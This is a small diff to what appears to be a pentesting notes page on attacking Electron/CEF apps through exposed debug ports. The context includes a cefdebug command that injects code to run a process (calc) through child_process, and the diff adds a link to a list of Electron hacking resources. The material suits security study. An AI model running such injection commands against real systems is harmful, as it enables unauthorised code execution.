@@ -20,6 +20,8 @@ But obviously the exploitation will be **much easier locally**, as you can use a
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 
+List of resources to pwn electorn apps: [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
+
 ## References
 
 * [https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
